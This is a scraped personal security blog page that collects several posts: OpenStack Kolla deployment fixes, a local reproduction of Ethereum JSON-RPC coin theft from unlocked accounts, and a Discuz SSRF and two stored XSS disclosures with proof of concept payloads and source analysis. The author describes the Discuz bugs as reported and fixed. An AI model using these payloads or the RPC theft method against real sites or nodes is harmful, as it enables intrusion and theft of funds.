<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">问题：</span><br><span class="line">The conditional check &apos;config_json.changed | bool or rabbitmq_confs.changed</span><br><span class="line"></span><br><span class="line">解决办法：kolla和kolla-ansible 都切到stable版本</span><br><span class="line"></span><br><span class="line">问题：</span><br><span class="line">fatal: [localhost]: FAILED! =&gt; &#123;&quot;msg&quot;: &quot;Unable to look up a name or access an attribute in template string (&#123;&#123; inventory_hostname in groups[&apos;neutron-metering-agent&apos;] &#125;&#125;).\nMake sure your variable name does not contain invalid characters like &apos;-&apos;: argument of type &apos;StrictUndefined&apos; is not iterable&quot;&#125;</span><br><span class="line"></span><br><span class="line">解决办法：</span><br><span class="line">直接禁用haproxy</span><br><span class="line"></span><br><span class="line">问题：</span><br><span class="line">failed: [localhost] (item=/usr/share/kolla-ansible/ansible/roles/haproxy/templates/haproxy.cfg.j2) =&gt; &#123;&quot;changed&quot;: false, &quot;item&quot;: &quot;/usr/share/kolla-ansible/ansible/roles/haproxy/templates/haproxy.cfg.j2&quot;, &quot;msg&quot;: &quot;AnsibleUndefinedVariable: &apos;dict object&apos; has no attribute &apos;glance-registry&apos;&quot;&#125;</span><br><span class="line"></span><br><span class="line">解决办法：直接禁用haproxy</span><br><span class="line">enable_haproxy: &quot;no&quot;</span><br><span class="line"></span><br><span class="line">问题：</span><br><span class="line">rabbitmq_monitoring_password&apos; is undefined&quot;</span><br><span class="line"></span><br><span class="line">问题：</span><br><span class="line">.docker.io/v2/: dial tcp: lookup registry-1.docker.io on 192.168.0.2:53: read udp 192.168.0.10:48758-&gt;192.168.0.2:53: i/o timeout\&quot;)\\n&apos;&quot;&#125;</span><br><span class="line"></span><br><span class="line">解决办法：</span><br><span class="line">修改/etc/hosts添加dns服务器:nameserver 8.8.8.8</span><br><span class="line"></span><br><span class="line">问题：</span><br><span class="line">只有一张物理网卡</span><br><span class="line"></span><br><span class="line">解决办法：</span><br><span class="line">ifconfig创建一个虚拟网卡</span><br><span class="line">ifconfig eth0:0 192.168.10.10 up</span><br><span class="line"></span><br><span class="line">问题：</span><br><span class="line">docker需要认证</span><br><span class="line"></span><br><span class="line">解决办法：</span><br><span class="line">docker login命令先登陆</span><br><span class="line"></span><br><span class="line">问题：</span><br><span class="line">TASK [neutron : Running Neutron bootstrap container] *************************** 卡住了</span><br></pre></td></tr></table></figure>
</li>
<li><p>部署前检查报错</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fatal: [localhost]: FAILED! =&gt; &#123;&quot;changed&quot;: false, &quot;cmd&quot;: [&quot;ip&quot;, &quot;-4&quot;, &quot;-o&quot;, &quot;addr&quot;, &quot;show&quot;, &quot;dev&quot;, &quot;eth0&quot;], &quot;delta&quot;: &quot;0:00:00.043125&quot;, &quot;end&quot;: &quot;2019-01-10 13:48:41.975511&quot;, &quot;failed_when_result&quot;: true, &quot;rc&quot;: 0, &quot;start&quot;: &quot;2019-01-10 13:48:41.932386&quot;, &quot;stderr&quot;: &quot;&quot;, &quot;stderr_lines&quot;: [], &quot;stdout&quot;: &quot;2: eth0    inet 192.168.16.88/20 brd 192.168.31.255 scope global noprefixroute eth0\\       valid_lft forever preferred_lft forever&quot;, &quot;stdout_lines&quot;: [&quot;2: eth0    inet 192.168.16.88/20 brd 192.168.31.255 scope global noprefixroute eth0\\       valid_lft forever preferred_lft forever&quot;]&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>登陆dabashboard提示证书不可用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">原因：账号密码不正确</span><br><span class="line"></span><br><span class="line">账号默认是admin，密码在cat /etc/kolla/passwords.yml|grep -i keystone_admin</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h1 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h1><ol>
<li>kolla-ansible和kolla项目切到稳定分支</li>
<li>如果在virtualbox中安装时，centos7镜像选择minimal。dvd版 4G+太大了</li>
<li>没有双网卡可以使用ifconfig虚拟一张网卡</li>
</ol>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="!https://blog.csdn.net/Jmilk/article/details/80500234#%E6%A3%80%E9%AA%8C-%E4%BD%BF%E7%94%A8">Kolla 让 OpenStack 部署更贴心</a></p>
<p><a href="!https://cloud.tencent.com/developer/article/1073885">Docker 容器化部署运维 OpenStack 和 Ceph</a></p>
<p><a href="!https://docs.openstack.org/project-deploy-guide/kolla-ansible/ocata/">官方文档</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/blog/2019/01/05/以太坊rpc接口盗币漏洞复现/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="leveryd">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/blog/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="leveryd个人博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/blog/2019/01/05/以太坊rpc接口盗币漏洞复现/" itemprop="url">以太坊rpc接口盗币漏洞学习笔记</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-01-05T23:10:51+08:00">
                2019-01-05
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>关于漏洞是什么，可以阅读参考中的<code>金钱难寐，大盗独行——以太坊 JSON-RPC 接口多种盗币手法大揭秘</code>。</p>
<p>因为不清楚最新的以太坊程序是否已不存在此问题，所以对这个安全漏洞做了一次本地环境的测试。</p>
<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><h2 id="搭建私链"><a href="#搭建私链" class="headerlink" title="搭建私链"></a>搭建私链</h2><p>根据参考中的的<code>如何搭建以太坊私有链</code>，基本没坑地在本地起了一个以太坊节点。</p>
<p>自己一开始使用–testnet参数，却好像因为不能同步测试网络的原因，区块链高度（eth.blockNumber）一直是0。最终就没在测试网络复现了。</p>
<p>如果不是mac，可以在geth容器里操作，后面的步骤还是参考<code>如何搭建以太坊私有链</code>。</p>
<p>进入geth容器命令行：</p>
<p><code>docker run -ti --name ethereum-node --entrypoint=&quot;/bin/sh&quot; -v /mnt/files/myethereum:/root -p 8546:8545 -p 30303:30303 ethereum/client-go</code></p>
<p>需要注意的地方：</p>
<ol>
<li>使用geth –datadir data0 –networkid 1108 –rpcaddr 0.0.0.0 –rpc –rpccorsdomain “<em>“ –rpcapi “web3,eth” –rpcvhosts=</em> console开放rpc端口</li>
<li>使用容器搭建环境，需要指定–entrypoint来进容器里</li>
</ol>
<h2 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h2><p>需要安装python3</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># coding:utf-8</span><br><span class="line">from web3 import Web3, HTTPProvider</span><br><span class="line">import time</span><br><span class="line">web3 = Web3(HTTPProvider(&apos;http://localhost:8545&apos;))</span><br><span class="line">eth = web3.eth</span><br><span class="line">print(web3.eth.blockNumber)</span><br><span class="line"># print(web3.eth.accounts)</span><br><span class="line">print(eth.getBalance(eth.accounts[0]))</span><br><span class="line">print(eth.getBalance(eth.accounts[1]))</span><br><span class="line">web3.eth.sendTransaction(&#123;&apos;to&apos;: eth.accounts[1], &apos;from&apos;: eth.accounts[0], &apos;value&apos;: 12345&#125;)</span><br></pre></td></tr></table></figure>
<h1 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h1><ol>
<li>新建两个账号</li>
<li>给账号一挖矿，拿钱</li>
<li><p>模拟攻击者调rpc接口偷账号一的钱到账户二 (没有解锁用户时)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">➜  /tmp python3 转账测试.py</span><br><span class="line">1539</span><br><span class="line">7694999999999994741030</span><br><span class="line">5258970</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;转账测试.py&quot;, line 15, in &lt;module&gt;</span><br><span class="line">    web3.eth.sendTransaction(&#123;&apos;to&apos;: eth.accounts[1], &apos;from&apos;: eth.accounts[0], &apos;value&apos;: 12345&#125;)</span><br><span class="line">  File &quot;/usr/local/lib/python3.7/site-packages/web3/eth.py&quot;, line 268, in sendTransaction</span><br><span class="line">    [transaction],</span><br><span class="line">  File &quot;/usr/local/lib/python3.7/site-packages/web3/manager.py&quot;, line 112, in request_blocking</span><br><span class="line">    raise ValueError(response[&quot;error&quot;])</span><br><span class="line">ValueError: &#123;&apos;code&apos;: -32000, &apos;message&apos;: &apos;authentication needed: password or unlock&apos;&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>模拟攻击者调rpc接口偷账号一的钱到账户二 (解锁用户时)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">personal.unlockAccount(eth.accounts[0])   解锁时间默认为300秒</span><br><span class="line">再运行python3 转账测试.py，此时交易就被提交上去了</span><br></pre></td></tr></table></figure>
</li>
<li><p>如此重复调用转账测试.py，区块链高度不断增加，账户一的余额越来越少</p>
</li>
</ol>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol>
<li>这个解锁用户后一段时间内无需密码是个功能，最新版的以太坊程序一样存在。</li>
<li>不太清楚真实世界里，unlockAccount是怎么发生的。</li>
</ol>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="!https//paper.seebug.org/656/">金钱难寐，大盗独行——以太坊 JSON-RPC 接口多种盗币手法大揭秘</a><br><a href="!https://learnblockchain.cn/2018/03/18/create_private_blockchain/">如何搭建以太坊私有链</a><br><a href="!http://www.hi-roy.com/2018/05/25/基于Docker的以太坊开发环境搭建/">基于Docker的以太坊开发环境搭建</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/blog/2017/11/01/Disucz新版ssrf/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="leveryd">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/blog/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="leveryd个人博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/blog/2017/11/01/Disucz新版ssrf/" itemprop="url">Disucz ssrf一处</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-11-01T23:14:59+08:00">
                2017-11-01
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>之前提交到某平台的漏洞，现在已经修复</p>
<h1 id="漏洞证明"><a href="#漏洞证明" class="headerlink" title="漏洞证明"></a>漏洞证明</h1><ol>
<li>前提条件<br>用户可以发帖</li>
<li>复现步骤<br>发表帖子后,访问如下链接：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">forum.php?mod=ajax&amp;action=setthreadcover&amp;inajax=1&amp;fid=2&amp;wysiwyg=1&amp;imgurl=ftp://127.0.0.1:8089&amp;tid=26815&amp;pid=1</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>其中的imgurl是ssrf探测的地址,另外需要将tid修改为自己发表的帖子的tid值.这个值在chrome浏览器前端中搜索tid可以找到.</p>
<p><img src="/img/6.png" alt=""></p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>漏洞触发的代码在source/module/forum/forum_ajax.phpforum_ajax.php文件大约211行处,调用了setthreadcover函数.</p>
<p>函数会根据第五个参数imgurl发起网络请求,此处imgurl刚好可控.<br><img src="/img/7.png" alt=""></p>
<p>最终在source/class/class_image.php的init函数中发起请求<br><img src="/img/8.png" alt=""></p>
<h1 id="挖这个洞的思路"><a href="#挖这个洞的思路" class="headerlink" title="挖这个洞的思路"></a>挖这个洞的思路</h1><ol>
<li>思路比较简单，在这个source/class/class_image.php中看到init函数发起网络请求,向上找调用init函数的地方挖掘漏洞.</li>
</ol>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/blog/2017/10/30/Disucz正文存储型XSS-2/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="leveryd">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/blog/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="leveryd个人博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/blog/2017/10/30/Disucz正文存储型XSS-2/" itemprop="url">Disucz正文存储型XSS(2)</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-10-30T23:08:34+08:00">
                2017-10-30
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>之前提交到某平台的漏洞，现在已经修复</p>
<h1 id="漏洞证明"><a href="#漏洞证明" class="headerlink" title="漏洞证明"></a>漏洞证明</h1><p>2017.9月份在3.3,3.4最新版测试通过</p>
<p>前提条件:</p>
<ol>
<li>用户组允许使用media标签</li>
<li>非PC端用户(程序会判断UA)</li>
</ol>
<p>复现步骤:<br>0x1. 可以使用media标签的用户发表一篇文章<br>文章内容为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[media=mp3,200,300]http://www.tudou.com/programs/view/a&apos; onload=alert(1) onerror=alert(1)[/media]</span><br></pre></td></tr></table></figure></p>
<p>0x2. 使用手机，或者使用UA修改工具，修改成移动端头部<br>0x3. 浏览刚发过的帖子，视频加载完毕后，执行onload事件，会弹窗.<br><img src="/img/5.png" alt=""></p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;span id=&quot;flv_dWh&quot;&gt;&lt;/span&gt;&lt;script type=&quot;text/javascript&quot; reload=&quot;1&quot;&gt;$(&apos;flv_dWh&apos;).innerHTML=(mobileplayer() ? &quot;&lt;iframe height=&apos;300&apos; width=&apos;200&apos; src=&apos;http://www.tudou.com/programs/view/html5embed.action?code=a\\\&apos; onload=alert(1) onerror=alert(1)&apos; frameborder=0 allowfullscreen&gt;&lt;/iframe&gt;&quot; : AC_FL_RunContent(&apos;width&apos;, &apos;200&apos;, &apos;height&apos;, &apos;300&apos;, &apos;allowNetworking&apos;, &apos;internal&apos;, &apos;allowScriptAccess&apos;, &apos;never&apos;, &apos;src&apos;, &apos;http://www.tudou.com/v/a\\\&apos; onload=alert(1) onerror=alert(1)&apos;, &apos;quality&apos;, &apos;high&apos;, &apos;bgcolor&apos;, &apos;#ffffff&apos;, &apos;wmode&apos;, &apos;transparent&apos;, &apos;allowfullscreen&apos;, &apos;true&apos;));&lt;/script&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;</span><br></pre></td></tr></table></figure>
<p>前端页面中有这么一段代码，非PC时，mobileplayer()=true.<br>简化下上面的代码，如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(&apos;flv_dWh&apos;).innerHTML=&quot;&lt;iframe src=&apos;http://www.tudou.com/programs/view/html5embed.action?code=a\\\&apos; onload=alert(1)&quot;</span><br></pre></td></tr></table></figure></p>
<p>其中虽然src属性单引号看似没有闭合，但是实际上浏览器解析时已经闭合了，于是就引入了一个onload属性。</p>
<p>至于后端的代码，在<code>source/function/function_discuzcode.php</code>文件的<code>parseflv</code>函数中下断点可以调试漏洞，这里就不详细说明。</p>
<h1 id="漏洞总结"><a href="#漏洞总结" class="headerlink" title="漏洞总结"></a>漏洞总结</h1><p><code>src=&#39;&lt;?php addslashes(&quot;可控内容&quot;)?&gt;&#39;</code><br>这样是不能防XSS的,用下面这样的代码是可以弹框的。<br><code>&lt;img src=&#39;x\&#39; onerror=alert(1)//&#39;&gt;</code></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/blog/2017/10/11/x/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="leveryd">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/blog/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="leveryd个人博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/blog/2017/10/11/x/" itemprop="url">Discuz存储型XSS(1)</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-10-11T17:13:06+08:00">
                2017-10-11
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>之前提交到某平台的漏洞，现在已经修复</p>
<h1 id="漏洞证明"><a href="#漏洞证明" class="headerlink" title="漏洞证明"></a>漏洞证明</h1><ol>
<li>漏洞需要开启后台四方格功能<br><img src="/img/1.jpeg" alt=""></li>
<li>发表新帖子,在帖子标题中设置为payload<br><code>&amp;#x003c;img src=1 onerror=alert(1)&amp;#x003e;</code></li>
<li>然后在首页鼠标放在帖子准备点击我们刚才的发表的帖子时，触发onmouseover事件，执行我们的代码。<br><img src="/img/2.jpeg" alt=""><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1>鼠标放在帖子上准备点击时，触发onmouseover事件。onmouseover事件中调用的showTip函数最终调用到了_showTip函数<br><img src="/img/3.jpeg" alt=""></li>
</ol>
<p>_showTip函数中使用getAtrribute取了tip属性值，然后又放入innerHTML。<br>重点是getAtrribute函数获取属性值时会自动解码实体编码后的值，这样<code>&amp;#x003c;img src=1 onerror=alert(1)&amp;#x003e;</code>就变成<code>&lt;img src=1 onerror=alert(1)&gt;</code>。<br><img src="/img/4.png" alt=""></p>
<p>另外此漏洞中的payload只能用<br><code>&amp;#x003c;img src=1 onerror=alert(1)&amp;#x003e;</code><br>而不能用<br><code>&amp;#x3c;img src=1 onerror=alert(1)&amp;#x3e;</code><br>这是由于Discuz中dhtmlspecialchars函数实现问题。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">function dhtmlspecialchars($string, $flags = null) &#123;</span><br><span class="line">	if(is_array($string)) &#123;</span><br><span class="line">		foreach($string as $key =&gt; $val) &#123;</span><br><span class="line">			$string[$key] = dhtmlspecialchars($val, $flags);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		if($flags === null) &#123;</span><br><span class="line">			$string = str_replace(array(&apos;&amp;&apos;, &apos;&quot;&apos;, &apos;&lt;&apos;, &apos;&gt;&apos;), array(&apos;&amp;amp;&apos;, &apos;&amp;quot;&apos;, &apos;&amp;lt;&apos;, &apos;&amp;gt;&apos;), $string);</span><br><span class="line">			if(strpos($string, &apos;&amp;amp;#&apos;) !== false) &#123;</span><br><span class="line">				$string = preg_replace(&apos;/&amp;amp;((#(\d&#123;3,5&#125;|x[a-fA-F0-9]&#123;4&#125;));)/&apos;, &apos;&amp;\\1&apos;, $string);</span><br><span class="line">			&#125;  //在这一行又将 &amp;amp; 解码成 &amp;,导致htmlspecailchars和php中的htmlspecailchars函数差异</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			if(PHP_VERSION &lt; &apos;5.4.0&apos;) &#123;</span><br><span class="line">				$string = htmlspecialchars($string, $flags);</span><br><span class="line">			&#125; else &#123;</span><br><span class="line">				if(strtolower(CHARSET) == &apos;utf-8&apos;) &#123;</span><br><span class="line">					$charset = &apos;UTF-8&apos;;</span><br><span class="line">				&#125; else &#123;</span><br><span class="line">					$charset = &apos;ISO-8859-1&apos;;</span><br><span class="line">				&#125;</span><br><span class="line">				$string = htmlspecialchars($string, $flags, $charset);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	return $string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这个差异可以这么解释<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">htmlspecialchars(htmlspecialchars(&quot;&amp;#x003c;&quot;)); 值是&quot;&amp;amp;amp;#x003c;&quot;</span><br><span class="line">dhtmlspecialchars(dhtmlspecialchars(&quot;&amp;#x003c;&quot;)); 值是&quot;&amp;#x003c;&quot;</span><br></pre></td></tr></table></figure></p>
<p>而上面tip属性值就是两次dhtmlspecialchars了标题的值,输入存到数据库一次，输出时一次。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tip=dhtmlspecialchars(dhtmlspecialchars(标题));</span><br></pre></td></tr></table></figure></p>
<h1 id="漏洞总结"><a href="#漏洞总结" class="headerlink" title="漏洞总结"></a>漏洞总结</h1><ol>
<li>dhtmlspecialchars函数和实际的htmlspecialchars函数有差异</li>
<li>getAttribute函数会将属性值解码</li>
</ol>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  


          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">leveryd</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/blog/archives/">
              
                  <span class="site-state-item-count">8</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                
                  <span class="site-state-item-count">2</span>
                  <span class="site-state-item-name">标签</span>
                
              </div>
            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">leveryd</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/blog/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/blog/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/blog/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/blog/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/blog/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/blog/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/blog/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/blog/js/src/motion.js?v=5.1.4"></script>



  
  

  

  


  <script type="text/javascript" src="/blog/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
